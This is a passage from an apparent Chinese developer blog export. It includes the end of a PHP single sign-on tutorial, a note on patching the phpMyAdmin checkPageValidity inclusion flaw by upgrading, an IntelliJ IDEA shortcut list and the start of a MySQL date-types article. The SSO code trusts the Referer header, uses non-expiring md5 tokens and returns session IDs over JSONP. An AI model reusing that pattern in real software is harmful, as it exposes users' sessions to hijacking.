<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * [index 用户登录]</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Author</span>:wty</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@DateTime</span>:2016年12月12日11:22:02</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> [type] [description]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//可以适当加入用户ip作为加密因子和浏览器因数</span></span><br><span class="line">        <span class="variable">$token</span>=<span class="title function_ invoke__">I</span>(<span class="string">&#x27;get._token&#x27;</span>);<span class="comment">//加密串</span></span><br><span class="line">        <span class="variable">$timespan</span>=<span class="title function_ invoke__">I</span>(<span class="string">&#x27;get._ts&#x27;</span>);<span class="comment">//时间时间戳</span></span><br><span class="line">        <span class="variable">$referer</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];<span class="comment">//这里可以限定安全网址</span></span><br><span class="line">        <span class="variable">$error</span>=<span class="number">100</span>;</span><br><span class="line">        <span class="comment">//这里需要配置</span></span><br><span class="line">        <span class="variable">$allow</span>=<span class="title function_ invoke__">C</span>(<span class="string">&#x27;Allow_Site&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$referer</span>,<span class="variable">$allow</span>))&#123;<span class="comment">//如果是在允许访问列表里面</span></span><br><span class="line">        <span class="variable">$error</span>=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$token</span>&amp;&amp;<span class="variable">$timespan</span>)&#123;</span><br><span class="line">                <span class="variable">$error</span>=<span class="number">2</span>;</span><br><span class="line">                <span class="variable">$secretKey</span>=<span class="title function_ invoke__">C</span>(<span class="string">&#x27;SecretKey&#x27;</span>);<span class="comment">//秘钥</span></span><br><span class="line">                <span class="variable">$check</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$timespan</span>.<span class="variable">$secretKey</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$check</span>==<span class="variable">$token</span>)&#123;</span><br><span class="line">                    <span class="variable">$error</span>=<span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">session</span>(<span class="string">&#x27;?member&#x27;</span>))&#123;</span><br><span class="line">                        <span class="variable">$error</span>=<span class="number">0</span>;</span><br><span class="line">                        <span class="variable">$return</span>=<span class="keyword">array</span>(<span class="string">&#x27;error&#x27;</span>=&gt;<span class="number">0</span>,<span class="string">&#x27;username&#x27;</span>=&gt;<span class="title function_ invoke__">session</span>(<span class="string">&#x27;member.username&#x27;</span>),<span class="string">&#x27;sess_id&#x27;</span>=&gt;<span class="title function_ invoke__">session_id</span>());</span><br><span class="line">                        <span class="keyword">echo</span>  <span class="string">&#x27;jsonp_do(&#x27;</span>.<span class="title function_ invoke__">json_encode</span>(<span class="variable">$return</span>).<span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">                        <span class="keyword">exit</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="string">&#x27;jsonp_do(&#x27;</span>.<span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&#x27;error&#x27;</span>=&gt;<span class="variable">$error</span>)).<span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>现在多数网站都会采用到负载均衡多服务器，如果是多服务器的话，session的存储可以考虑的memcached或者redis中，上面说道php对于session的默认存储方式是files，如果用memcached的话，就要修改配置文件php.ini</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">session.save_handler</span>=memcached</span><br><span class="line"></span><br><span class="line"><span class="attr">session.save_path</span> = <span class="string">&quot;tpc://192.168.1.1&quot;</span></span><br></pre></td></tr></table></figure>

<p>在save_handler&#x3D;memcached或者memcache这里，有点区别，如果配置写的是memcached的话，下面的save_path就要写tcp:&#x2F;&#x2F;192.168.1.1：11211，如果是memcache的话，save_path就要填写为192.168.1.1:11211</p>
<p>差别不大。</p>
<p>至此简单版本的单点登录基本完成了。​</p>
]]></content>
      <categories>
        <category>Php</category>
      </categories>
      <tags>
        <tag>SSO</tag>
      </tags>
  </entry>
  <entry>
    <title>phpMyAdmin 函数缺陷可导致 GETSHELL</title>
    <url>/2018/09/phpmyadmin-bug/</url>
    <content><![CDATA[<h1 id="阿里云盾提示phpMyAdmin"><a href="#阿里云盾提示phpMyAdmin" class="headerlink" title="阿里云盾提示phpMyAdmin &lt;=4.8.1会出现漏洞有被SHELL风险，具体漏洞提醒："></a>阿里云盾提示<code>phpMyAdmin &lt;=4.8.1</code>会出现漏洞有被<code>SHELL</code>风险，具体漏洞提醒：</h1><h2 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h2><blockquote>
<p>phpMyAdmin &lt;&#x3D;4.8.1 后台checkPageValidity函数缺陷可导致GETSHELL</p>
</blockquote>
<span id="more"></span>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
<p>checkPageValidity函数对外部输入过滤不严，可导致本地包含任意文件。进一步地攻击者可通过注入代码到特定文件进行包含造成远程代码执行。</p>
</blockquote>
<p>这个漏洞，将<code>phpmyadmin</code>升级到最新版即可解决。</p>
<h2 id="查看兼容性："><a href="#查看兼容性：" class="headerlink" title="查看兼容性："></a>查看兼容性：</h2><p><span class="exturl" data-url="aHR0cHM6Ly93d3cucGhwbXlhZG1pbi5uZXQvZG93bmxvYWRzLw==">phpmyadmin查看最新版与MySQL和PHP版本的兼容性<i class="fa fa-external-link-alt"></i></span><br>当前<code>phpmyadmin</code>最新版为<code>4.8.2</code>，兼容<code>PHP 5.5 ~ 7.2</code>，<code>MySQL 5.5</code>及以上，我这个服务器是<code>PHP7.1.18</code>和<code>MariaDb10.1.33</code>所以直接升级到最新版就可以了。<br>因为<code>lnmp1.5</code>提供了升级脚本，直接升级即可。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> lnmp1.5</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./upgrade.sh phpmyadmin</span></span><br></pre></td></tr></table></figure>

<p>会跳转一下，输入版本号：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">You</span> can get version number from https://www.phpmyadmin.net/downloads/</span><br><span class="line"><span class="attribute">Please</span> enter phpMyAdmin version you want, (example: <span class="number">4</span>.<span class="number">8</span>.<span class="number">0</span> ): <span class="number">4</span>.<span class="number">8</span>.<span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>然后就升级完成了，再去阿里云里面验证一下漏洞，漏洞已失效。</p>
<h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><ol>
<li><p>如果你修改了<code>nginx</code>网站目录的位置，你需要修改一下<code>lnmp</code>配置文件<code>root/lnmp1.5/lnmp.conf</code>，将下面这里的路径改成你服务根目录的路径。</p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Default</span>\<span class="variable">_Website</span>\<span class="variable">_Dir</span>=<span class="string">&#x27;/home/wwwroot/default&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>如果你修改了<code>phpmyadmin</code>的目录名称，你需要修改升级所用的脚本文件<code>/root/lnmp1.5/include/upgrade_phpmyadmin.sh</code>。<br>将脚本中的<code>$&#123;Default_Website_Dir&#125;/phpmyadmin/</code>这样的路径全部改成<code>$&#123;Default_Website_Dir&#125;/你的phpmyadmin文件夹名/</code>。</p>
</li>
</ol>
<p>这样才可以升级成功，以上使用的是<code>lnmp1.5</code>版本，感谢军哥。</p>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>phpMyAdmin</tag>
      </tags>
  </entry>
  <entry>
    <title>IntelliJ Idea 常用快捷键 列表 (实战终极总结！！！！)</title>
    <url>/2017/04/java-idea/</url>
    <content><![CDATA[<h2 id="1-———–-自动代码-——–"><a href="#1-———–-自动代码-——–" class="headerlink" title="1. ———– 自动代码 ——–"></a>1. ———– 自动代码 ——–</h2><p>常用的有 fori&#x2F;sout&#x2F;psvm+Tab 即可生成循环、System.out、main 方法等 boilerplate 样板代码 </p>
<p>例如要输入 for (User user : users) 只需输入 user.for+Tab </p>
<span id="more"></span>

<p>再比如，要输入 Date birthday &#x3D; user.getBirthday (); 只需输入 user.getBirthday ().var+Tab 即可。代码标签输入完成后，按 Tab，生成代码。</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line"><span class="type">Ctrl</span><span class="operator">+</span><span class="type">Alt</span><span class="operator">+</span><span class="type">O</span> 优化导入的类和包 </span><br><span class="line"><span class="type">Alt</span><span class="operator">+</span><span class="type">Insert</span> 生成代码 (如 <span class="keyword">get</span>,<span class="keyword">set</span> 方法，构造函数等)   或者右键（<span class="type">Generate）</span> </span><br><span class="line">fori<span class="regexp">/sout/</span>psvm <span class="operator">+</span> <span class="type">Tab</span>  </span><br><span class="line"><span class="type">Ctrl</span><span class="operator">+</span><span class="type">Alt</span><span class="operator">+</span><span class="type">T</span>  生成 <span class="keyword">try</span> <span class="keyword">catch</span>  或者 <span class="type">Alt</span><span class="operator">+</span>enter </span><br><span class="line"><span class="type">CTRL</span><span class="operator">+</span><span class="type">ALT</span><span class="operator">+</span><span class="type">T</span>  把选中的代码放在 <span class="type">TRY</span> &#123;&#125; <span class="type">IF</span> &#123;&#125; <span class="type">ELSE</span> &#123;&#125; 里 </span><br><span class="line"><span class="type">Ctrl</span> <span class="operator">+</span> <span class="type">O</span> 重写方法  </span><br><span class="line"><span class="type">Ctrl</span> <span class="operator">+</span> <span class="type">I</span> 实现方法 </span><br><span class="line"><span class="type">Ctr</span><span class="operator">+</span>shift<span class="operator">+</span><span class="type">U</span> 大小写转化  </span><br><span class="line"><span class="type">ALT</span> <span class="operator">+</span> 回车    导入包，自动修正  </span><br><span class="line"><span class="type">ALT</span><span class="operator">+/</span>       代码提示 </span><br><span class="line"><span class="type">CTRL</span><span class="operator">+</span><span class="type">J</span>      自动代码  </span><br><span class="line"><span class="type">Ctrl</span><span class="operator">+</span><span class="type">Shift</span><span class="operator">+</span><span class="type">J，整合两行为一行</span> </span><br><span class="line"><span class="type">CTRL</span> <span class="operator">+</span> 空格   代码提示  </span><br><span class="line"><span class="type">CTRL</span><span class="operator">+</span><span class="type">SHIFT</span><span class="operator">+</span><span class="type">SPACE</span> 自动补全代码  </span><br><span class="line"><span class="type">CTRL</span><span class="operator">+</span><span class="type">ALT</span><span class="operator">+</span><span class="type">L</span>  格式化代码  </span><br><span class="line"><span class="type">CTRL</span><span class="operator">+</span><span class="type">ALT</span><span class="operator">+</span><span class="type">I</span>  自动缩进  </span><br><span class="line"><span class="type">CTRL</span><span class="operator">+</span><span class="type">ALT</span><span class="operator">+</span><span class="type">O</span>  优化导入的类和包  </span><br><span class="line"><span class="type">ALT</span><span class="operator">+</span><span class="type">INSERT</span>  生成代码 (如 <span class="type">GET</span>,<span class="type">SET</span> 方法，构造函数等)  </span><br><span class="line"><span class="type">CTRL</span><span class="operator">+</span><span class="type">E</span>      最近更改的代码  </span><br><span class="line"><span class="type">CTRL</span><span class="operator">+</span><span class="type">ALT</span><span class="operator">+</span><span class="type">SPACE</span>  类名或接口名提示  </span><br><span class="line"><span class="type">CTRL</span><span class="operator">+</span><span class="type">P</span>   方法参数提示  </span><br><span class="line"><span class="type">CTRL</span><span class="operator">+</span><span class="type">Q，可以看到当前方法的声明</span> </span><br><span class="line">  </span><br><span class="line"><span class="type">Shift</span><span class="operator">+</span><span class="type">F6</span>  重构 <span class="operator">-</span> 重命名 (包<span class="operator">、</span>类<span class="operator">、</span>方法<span class="operator">、</span>变量<span class="operator">、</span>甚至注释等) </span><br><span class="line"><span class="type">Ctrl</span><span class="operator">+</span><span class="type">Alt</span><span class="operator">+</span><span class="type">V</span> 提取变量 </span><br></pre></td></tr></table></figure>

<h2 id="2-———–-查询快捷键-——–"><a href="#2-———–-查询快捷键-——–" class="headerlink" title="2. ———– 查询快捷键 ——–"></a>2. ———– 查询快捷键 ——–</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">Ctrl＋Shift＋Backspace 可以跳转到上次编辑的地 </span><br><span class="line">CTRL+ALT+ <span class="attribute">left</span>/<span class="attribute">right</span> 前后导航编辑过的地方 </span><br><span class="line">ALT+<span class="number">7</span>  靠左窗口显示当前文件的结构 </span><br><span class="line">Ctrl+F12 浮动显示当前文件的结构 </span><br><span class="line">ALT+F7 找到你的函数或者变量或者类的所有引用到的地方 </span><br><span class="line">CTRL+ALT+F7  找到你的函数或者变量或者类的所有引用到的地方 </span><br><span class="line"></span><br><span class="line">Ctrl+Shift+Alt+N 查找类中的方法或变量 </span><br><span class="line">双击 SHIFT 在项目的所有目录查找文件 </span><br><span class="line">Ctrl+N   查找类 </span><br><span class="line">Ctrl+Shift+N 查找文件 </span><br><span class="line">CTRL+G   定位行  </span><br><span class="line">CTRL+F   在当前窗口查找文本  </span><br><span class="line">CTRL+SHIFT+F  在指定窗口查找文本  </span><br><span class="line">CTRL+R   在 当前窗口替换文本  </span><br><span class="line">CTRL+SHIFT+R  在指定窗口替换文本  </span><br><span class="line">ALT+SHIFT+C  查找修改的文件  </span><br><span class="line">CTRL+E   最近打开的文件  </span><br><span class="line">F3   向下查找关键字出现位置  </span><br><span class="line">SHIFT+F3  向上一个关键字出现位置  </span><br><span class="line">选中文本，按 Alt+F3 ，高亮相同文本，F3 逐个往下查找相同文本 </span><br><span class="line">F4   查找变量来源  </span><br><span class="line"></span><br><span class="line">CTRL+SHIFT+O  弹出显示查找内容 </span><br><span class="line"></span><br><span class="line">Ctrl+W 选中代码，连续按会有其他效果 </span><br><span class="line">F2 或 Shift+F2 高亮错误或警告快速定位 </span><br><span class="line">Ctrl+Up/Down 光标跳转到第一行或最后一行下 </span><br><span class="line"></span><br><span class="line">Ctrl+<span class="selector-tag">B</span> 快速打开光标处的类或方法  </span><br><span class="line">CTRL+ALT+<span class="selector-tag">B</span>  找所有的子类  </span><br><span class="line">CTRL+SHIFT+<span class="selector-tag">B</span>  找变量的类  </span><br><span class="line"></span><br><span class="line">Ctrl+Shift + 上下键  上下移动代码 </span><br><span class="line">Ctrl+Alt+ <span class="attribute">left</span>/<span class="attribute">right</span> 返回至上次浏览的位置 </span><br><span class="line">Ctrl+X 删除行 </span><br><span class="line">Ctrl+D 复制行 </span><br><span class="line">Ctrl+/ 或 Ctrl+Shift+/  注释（// 或者 <span class="comment">/*...*/</span> ） </span><br><span class="line"></span><br><span class="line">Ctrl+H 显示类结构图 </span><br><span class="line">Ctrl+<span class="selector-tag">Q</span> 显示注释文档 </span><br><span class="line"></span><br><span class="line">Alt+F1 查找代码所在位置 </span><br><span class="line">Alt+<span class="number">1</span> 快速打开或隐藏工程面板 </span><br><span class="line"></span><br><span class="line">Alt+ <span class="attribute">left</span>/<span class="attribute">right</span> 切换代码视图 </span><br><span class="line">ALT+ ↑/↓  在方法间快速移动定位  </span><br><span class="line">CTRL+ALT+ <span class="attribute">left</span>/<span class="attribute">right</span> 前后导航编辑过的地方 </span><br><span class="line">Ctrl＋Shift＋Backspace 可以跳转到上次编辑的地 </span><br><span class="line">Alt+<span class="number">6</span>    查找 TODO </span><br></pre></td></tr></table></figure>

<h2 id="3-———————-其他快捷键-——————"><a href="#3-———————-其他快捷键-——————" class="headerlink" title="3. ——————— 其他快捷键 ——————-"></a>3. ——————— 其他快捷键 ——————-</h2><figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHIFT+ENTER </span>另起一行 </span><br><span class="line">CTRL+Z   倒退 (撤销) </span><br><span class="line">CTRL+<span class="keyword">SHIFT+Z </span> 向前 (取消撤销) </span><br><span class="line">CTRL+ALT+F12  资源管理器打开文件夹  </span><br><span class="line">ALT+F1   查找文件所在目录位置  </span><br><span class="line"><span class="keyword">SHIFT+ALT+INSERT </span>竖编辑模式  </span><br><span class="line">CTRL+F4  关闭当前窗口 </span><br><span class="line">Ctrl+Alt+V，可以引入变量。例如：new String ()<span class="comment">; 自动导入变量定义 </span></span><br><span class="line">Ctrl+~，快速切换方案（界面外观、代码风格、快捷键映射等菜单） </span><br></pre></td></tr></table></figure>

<h2 id="4-————–svn-快捷键-—————"><a href="#4-————–svn-快捷键-—————" class="headerlink" title="4. ————–svn 快捷键 —————"></a>4. ————–svn 快捷键 —————</h2><figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">ctrl+k 提交代码到 SVN </span><br><span class="line">ctrl+<span class="built_in">t</span> 更新代码 </span><br></pre></td></tr></table></figure>

<h2 id="5-————–-调试快捷键-—————"><a href="#5-————–-调试快捷键-—————" class="headerlink" title="5. ————– 调试快捷键 —————"></a>5. ————– 调试快捷键 —————</h2><p>其实常用的 就是 F8 F7 F9 最值得一提的 就是 Drop Frame  可以让运行过的代码从头再来</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">alt+F8          <span class="built_in">debug</span> 时选中查看值 </span><br><span class="line">Alt+<span class="keyword">Shift+F9，选择 </span><span class="built_in">Debug</span> </span><br><span class="line">Alt+<span class="keyword">Shift+F10，选择 </span>Run </span><br><span class="line">Ctrl+<span class="keyword">Shift+F9，编译 </span></span><br><span class="line">Ctrl+<span class="keyword">Shift+F8，查看断点 </span></span><br><span class="line"></span><br><span class="line">F7，步入 </span><br><span class="line"><span class="keyword">Shift+F7，智能步入 </span></span><br><span class="line">Alt+<span class="keyword">Shift+F7，强制步入 </span></span><br><span class="line">F8，步过 </span><br><span class="line"><span class="keyword">Shift+F8，步出 </span></span><br><span class="line">Alt+<span class="keyword">Shift+F8，强制步过 </span></span><br><span class="line"></span><br><span class="line">Alt+F9，运行至光标处 </span><br><span class="line">Ctrl+Alt+F9，强制运行至光标处 </span><br><span class="line">F9，恢复程序 </span><br><span class="line">Alt+F10，定位到断点 </span><br></pre></td></tr></table></figure>

<h2 id="6-————–-重构-—————"><a href="#6-————–-重构-—————" class="headerlink" title="6. ————– 重构 —————"></a>6. ————– 重构 —————</h2><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">Ctrl+Alt+<span class="built_in">Shift</span>+T，弹出重构菜单 </span><br><span class="line"><span class="built_in">Shift</span>+F6，重命名 </span><br><span class="line">F6，移动 </span><br><span class="line">F5，复制 </span><br><span class="line">Alt+Delete，安全删除 </span><br><span class="line">Ctrl+Alt+N，内联</span><br></pre></td></tr></table></figure>

<p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; </p>
<h2 id="十大-Intellij-IDEA-快捷键"><a href="#十大-Intellij-IDEA-快捷键" class="headerlink" title="十大 Intellij IDEA 快捷键"></a>十大 Intellij IDEA 快捷键</h2><p>Intellij IDEA 中有很多快捷键让人爱不释手，stackoverflow 上也有一些有趣的讨论。每个人都有自己的最爱，想排出个理想的榜单还真是困难。<br>以前也整理过 Intellij 的快捷键，这次就按照我日常开发时的使用频率，简单分类列一下我最喜欢的十大快捷 - 神 - 键吧。 </p>
<h2 id="1-智能提示"><a href="#1-智能提示" class="headerlink" title="1 智能提示:"></a>1 智能提示:</h2><p>Intellij 首当其冲的当然就是 Intelligence 智能！基本的代码提示用 Ctrl+Space，还有更智能地按类型信息提示 Ctrl+Shift+Space，但因为 Intellij 总是随着我们敲击而自动提示，所以很多时候都不会手动敲这两个快捷键 (除非提示框消失了)。用 F2&#x2F; Shift+F2 移动到有错误的代码，Alt+Enter 快速修复 (即 Eclipse 中的 Quick Fix 功能)。当智能提示为我们自动补全方法名时，我们通常要自己补上行尾的反括号和分号，当括号嵌套很多层时会很麻烦，这时我们只需敲 Ctrl+Shift+Enter 就能自动补全末尾的字符。而且不只是括号，例如敲完 if&#x2F;for 时也可以自动补上 {} 花括号。 </p>
<p>最后要说一点，Intellij 能够智能感知 Spring、Hibernate 等主流框架的配置文件和类，以静制动，在看似 “静态” 的外表下，智能地扫描理解你的项目是如何构造和配置的。 </p>
<h2 id="2-重构"><a href="#2-重构" class="headerlink" title="2 重构:"></a>2 重构:</h2><p>Intellij 重构是另一完爆 Eclipse 的功能，其智能程度令人瞠目结舌，比如提取变量时自动检查到所有匹配同时提取成一个变量等。尤其看过《重构 - 改善既有代码设计》之后，有了 Intellij 的配合简直是令人大呼过瘾！也正是强大的智能和重构功能，使 Intellij 下的 TDD 开发非常顺畅。 </p>
<p>切入正题，先说一个无敌的重构功能大汇总快捷键 Ctrl+Shift+Alt+T，叫做 Refactor This。按法有点复杂，但也符合 Intellij 的风格，很多快捷键都要双手完成，而不像 Eclipse 不少最有用的快捷键可以潇洒地单手完成 (不知道算不算 Eclipse 的一大优点)，但各位用过 Emacs 的话就会觉得也没什么了 (非 Emacs 黑)。此外，还有些最常用的重构技巧，因为太常用了，若每次都在 Refactor This 菜单里选的话效率有些低。比如 Shift+F6 直接就是改名，Ctrl+Alt+V 则是提取变量。 </p>
<h2 id="3-代码生成："><a href="#3-代码生成：" class="headerlink" title="3 代码生成："></a>3 代码生成：</h2><p>这一点类似 Eclipse，虽不是独到之处，但因为日常使用频率极高，所以还是罗列在榜单前面。常用的有 fori&#x2F;sout&#x2F;psvm+Tab 即可生成循环、System.out、main 方法等 boilerplate 样板代码，用 Ctrl+J 可以查看所有模板。后面 “辅助” 一节中将会讲到 Alt+Insert，在编辑窗口中点击可以生成构造函数、toString、getter&#x2F;setter、重写父类方法等。这两个技巧实在太常用了，几乎每天都要生成一堆 main、System.out 和 getter&#x2F;setter。 </p>
<p>另外，Intellij IDEA 13 中加入了后缀自动补全功能 (Postfix Completion)，比模板生成更加灵活和强大。例如要输入 for (User user : users) 只需输入 user.for+Tab。再比如，要输入 Date birthday &#x3D; user.getBirthday (); 只需输入 user.getBirthday ().var+Tab 即可。 </p>
<h2 id="4-编辑："><a href="#4-编辑：" class="headerlink" title="4 编辑："></a>4 编辑：</h2><p>编辑中不得不说的一大神键就是能够自动按语法选中代码的 Ctrl+W 以及反向的 Ctrl+Shift+W 了。此外，Ctrl+Left&#x2F;Right 移动光标到前 &#x2F; 后单词，Ctrl+[&#x2F;] 移动到前 &#x2F; 后代码块，这些类 Vim 风格的光标移动也是一大亮点。以上 Ctrl+Left&#x2F;Right&#x2F;[] 加上 Shift 的话就能选中跳跃范围内的代码。Alt+Forward&#x2F;Backward 移动到前 &#x2F; 后方法。还有些非常普通的像 Ctrl+Y 删除行、Ctrl+D 复制行、Ctrl+&lt;&#x2F;&gt; 折叠代码就不多说了。 </p>
<p>关于光标移动再多扩展一点，除了 Intellij 本身已提供的功能外，我们还可以安装 ideaVim 或者 emacsIDEAs 享受到 Vim 的快速移动和 Emacs 的 AceJump 功能 (超爽！)。另外，Intellij 的书签功能也是不错的，用 Ctrl+Shift+Num 定义 1-10 书签 (再次按这组快捷键则是删除书签)，然后通过 Ctrl+Num 跳转。这避免了多次使用前 &#x2F; 下一编辑位置 Ctrl+Left&#x2F;Right 来回跳转的麻烦，而且此快捷键默认与 Windows 热键冲突 (默认多了 Alt，与 Windows 改变显示器显示方向冲突，一不小心显示器就变成倒着显式的了，冏啊)。 </p>
<h2 id="5-查找打开："><a href="#5-查找打开：" class="headerlink" title="5 查找打开："></a>5 查找打开：</h2><p>类似 Eclipse，Intellij 的 Ctrl+N&#x2F;Ctrl+Shift+N 可以打开类或资源，但 Intellij 更加智能一些，我们输入的任何字符都将看作模糊匹配，省却了 Eclipse 中还有输入 * 的麻烦。最新版本的 IDEA 还加入了 Search Everywhere 功能，只需按 Shift+Shift 即可在一个弹出框中搜索任何东西，包括类、资源、配置项、方法等等。 </p>
<p>类的继承关系则可用 Ctrl+H 打开类层次窗口，在继承层次上跳转则用 Ctrl+B&#x2F;Ctrl+Alt+B 分别对应父类或父方法定义和子类或子方法实现，查看当前类的所有方法用 Ctrl+F12。 </p>
<p>要找类或方法的使用也很简单，Alt+F7。要查找文本的出现位置就用 Ctrl+F&#x2F;Ctrl+Shift+F 在当前窗口或全工程中查找，再配合 F3&#x2F;Shift+F3 前后移动到下一匹配处。 </p>
<p>Intellij 更加智能的又一佐证是在任意菜单或显示窗口，都可以直接输入你要找的单词，Intellij 就会自动为你过滤。</p>
<h2 id="6-其他辅助："><a href="#6-其他辅助：" class="headerlink" title="6 其他辅助："></a>6 其他辅助：</h2><p>以上这些神键配上一些辅助快捷键，即可让你的双手 90% 以上的时间摆脱鼠标，专注于键盘仿佛在进行钢琴表演。这些不起眼却是至关重要的最后一块拼图有： </p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">Ø  命令：Ctrl+Shift+A 可以查找所有 Intellij 的命令，并且每个命令后面还有其快捷键。所以它不仅是一大神键，也是查找学习快捷键的工具。 </span><br><span class="line"></span><br><span class="line">Ø  新建：Alt+Insert 可以新建类、方法等任何东西。 </span><br><span class="line"></span><br><span class="line">Ø  格式化代码：格式化 <span class="keyword">import</span> 列表 Ctrl+Alt+O，格式化代码 Ctrl+Alt+L。 </span><br><span class="line"></span><br><span class="line">Ø  切换窗口：Alt+Num，常用的有 <span class="number">1</span> - 项目结构，<span class="number">3</span> - 搜索结果，<span class="number">4</span><span class="regexp">/5 - 运行调试。Ctrl+Tab 切换标签页，Ctrl+E/</span>Ctrl+Shift+E 打开最近打开过的或编辑过的文件。 </span><br><span class="line"></span><br><span class="line">Ø  单元测试：Ctrl+Alt+T 创建单元测试用例。 </span><br><span class="line"></span><br><span class="line">Ø  运行：Alt+Shift+F10 运行程序，Shift+F9 启动调试，Ctrl+F2 停止。 </span><br><span class="line"></span><br><span class="line">Ø  调试：F7<span class="regexp">/F8/</span>F9 分别对应 <span class="keyword">Step</span> <span class="keyword">into</span>，<span class="keyword">Step</span> over，<span class="keyword">Continue</span>。 </span><br></pre></td></tr></table></figure>

<p>此外还有些我自定义的，例如水平分屏 Ctrl+| 等，和一些神奇的小功能 Ctrl+Shift+V 粘贴很早以前拷贝过的，Alt+Shift+Insert 进入到列模式进行按列选中。 </p>
<figure class="highlight nsis"><table><tr><td class="code"><pre><span class="line">Ø  <span class="literal">Top</span> <span class="comment">#10 切来切去：Ctrl+Tab </span></span><br><span class="line"></span><br><span class="line">Ø  <span class="literal">Top</span> <span class="comment">#9 选你所想：Ctrl+W </span></span><br><span class="line"></span><br><span class="line">Ø  <span class="literal">Top</span> <span class="comment">#8 代码生成：Template/Postfix +Tab </span></span><br><span class="line"></span><br><span class="line">Ø  <span class="literal">Top</span> <span class="comment">#7 发号施令：Ctrl+Shift+A </span></span><br><span class="line"></span><br><span class="line">Ø  <span class="literal">Top</span> <span class="comment">#6 无处藏身：Shift+Shift </span></span><br><span class="line"></span><br><span class="line">Ø  <span class="literal">Top</span> <span class="comment">#5 自动完成：Ctrl+Shift+Enter </span></span><br><span class="line"></span><br><span class="line">Ø  <span class="literal">Top</span> <span class="comment">#4 创造万物：Alt+Insert </span></span><br></pre></td></tr></table></figure>

<h2 id="太难割舍，前三名并列吧！"><a href="#太难割舍，前三名并列吧！" class="headerlink" title="太难割舍，前三名并列吧！"></a>太难割舍，前三名并列吧！</h2><figure class="highlight nsis"><table><tr><td class="code"><pre><span class="line">Ø  <span class="literal">Top</span> <span class="comment">#1 智能补全：Ctrl+Shift+Space </span></span><br><span class="line"></span><br><span class="line">Ø  <span class="literal">Top</span> <span class="comment">#1 自我修复：Alt+Enter </span></span><br><span class="line"></span><br><span class="line">Ø  <span class="literal">Top</span> <span class="comment">#1 重构一切：Ctrl+Shift+Alt+T </span></span><br></pre></td></tr></table></figure>

<p>CTRL+ALT+ left&#x2F;right 前后导航编辑过的地方 </p>
<p>Ctrl＋Shift＋Backspace 可以跳转到上次编辑的地</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>IDEA</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL 日期数据类型、时间类型使用总结</title>
    <url>/2017/04/mysql-date/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>MySQL 日期类型：日期格式、所占存储空间、日期范围 比较。 </p>
<span id="more"></span>

